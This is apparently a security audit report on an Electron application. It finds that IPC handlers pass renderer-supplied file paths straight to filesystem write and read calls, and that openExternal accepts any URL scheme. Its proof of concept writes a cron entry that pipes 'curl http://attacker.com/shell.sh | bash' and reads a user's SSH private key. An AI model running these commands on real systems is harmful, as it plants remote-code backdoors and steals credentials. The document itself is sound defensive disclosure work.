# Audit Report

## Title
Missing Input Validation on IPC-Received File Paths Enables Arbitrary File Write/Read from Compromised Renderer

## Summary
Multiple Electron IPC handlers in the main process accept renderer-controlled file paths and pass them directly to Node.js filesystem APIs without any path validation, normalization, or directory restriction. A compromised renderer process can invoke these handlers to write or read arbitrary files accessible to the main process.

## Finding Description

**Finding 1 — `saveFileToPath` IPC handler (arbitrary file write)**

The handler at `front-end/src/main/modules/ipcHandlers/utils.ts` lines 156–175 accepts a renderer-supplied `filePath` and performs only a truthiness check before writing:

```ts
if (!filePath) throw new Error('File path is undefined');
await fs.promises.writeFile(filePath, data);
```

No path normalization, no directory allowlist, and no extension restriction are applied. [1](#0-0) 

**Finding 2 — `writeTransactionFile` IPC handler (arbitrary file write)**

The utility function at `front-end/src/main/utils/transactionFile.ts` writes directly to the renderer-supplied path:

```ts
const data = JSON.stringify(transactionFile);
await fsp.writeFile(filePath, data, { encoding: 'utf8' });
``` [2](#0-1) 

It is registered as an IPC handler via `createIPCChannel` in `front-end/src/main/modules/ipcHandlers/localUser/transactionFile.ts`. [3](#0-2) 

**Finding 3 — `readTransactionFile` IPC handler (arbitrary file read)**

The same utility file passes the renderer-supplied path directly to `fsp.readFile`:

```ts
const data = await fsp.readFile(filePath, { encoding: 'utf8' });
``` [4](#0-3) 

**Finding 4 — `openExternal` without URL scheme validation**

```ts
ipcMain.on(createChannelName('openExternal'), (_e, url: string) => shell.openExternal(url));
```

No scheme allowlist is enforced. A compromised renderer can pass `file://` URIs or other non-`https` schemes. [5](#0-4) 

**Preload exposure**

All four handlers are exposed to the renderer via `contextBridge.exposeInMainWorld`: [6](#0-5) [7](#0-6) [8](#0-7) 

## Impact Explanation

A compromised renderer process can invoke `window.electronAPI.local.utils.saveFileToPath(data, '/etc/cron.d/backdoor')` or `window.electronAPI.local.transactionFile.writeTransactionFile(payload, '/home/user/.ssh/authorized_keys')` directly, bypassing the native OS save dialog that the legitimate application flow uses. This enables:

- **Arbitrary file write** to any path writable by the Electron main process (which runs with full user privileges), enabling persistence mechanisms or overwriting application data.
- **Arbitrary file read** of any file accessible to the main process (private keys, credentials, SQLite databases, environment files).
- **Unvalidated `openExternal`** can be abused to open `file://` URIs in OS default handlers.

The normal application flow in `ExportTransactionController.vue` does call `showSaveDialog` first to obtain the path from a native OS dialog, but the IPC handler itself enforces no such requirement — a compromised renderer can call `saveFileToPath` directly with any path. [9](#0-8) 

## Likelihood Explanation

The window is configured with `contextIsolation: true` and `nodeIntegration: false`, which is correct. However, `sandbox: false` is set, meaning the preload script runs with full Node.js access. [10](#0-9) 

The app loads local files (`loadFile(join(process.env.DIST, 'index.html'))`), which reduces the XSS attack surface compared to apps loading remote URLs. However, a supply-chain compromise of any renderer-side npm package (which has access to the `window.electronAPI` object exposed by `contextBridge`) provides a direct path to these handlers without requiring any XSS. This is a realistic threat model for Electron applications with large dependency trees.

## Recommendation

1. **Path allowlisting for `saveFileToPath` and `writeTransactionFile`**: Validate that the resolved absolute path starts with an expected base directory (e.g., `app.getPath('documents')` or a user-configured export directory) using `path.resolve()` followed by a `startsWith` check.
2. **Remove `saveFileToPath` as a direct IPC handler**: Instead, require the path to always originate from a main-process-initiated `showSaveDialog` call, keeping the path entirely within the main process and never passing it back through IPC.
3. **Scheme allowlist for `openExternal`**: Only permit `https:` URLs, e.g.:
   ```ts
   if (new URL(url).protocol !== 'https:') return;
   shell.openExternal(url);
   ```
4. **Enable `sandbox: true`**: This further restricts the preload script environment and is the Electron-recommended configuration when `contextIsolation: true` is already set.

## Proof of Concept

```js
// Executed from a compromised renderer context (e.g., malicious npm package in renderer bundle)
// Arbitrary file write via saveFileToPath
await window.electronAPI.local.utils.saveFileToPath(
  '* * * * * root curl http://attacker.com/shell.sh | bash',
  '/etc/cron.d/backdoor'
);

// Arbitrary file read via readTransactionFile
const sshKey = await window.electronAPI.local.transactionFile.readTransactionFile(
  '/home/user/.ssh/id_rsa'
);
```

Both calls succeed because the IPC handlers perform no path validation beyond a truthiness check on `filePath`.
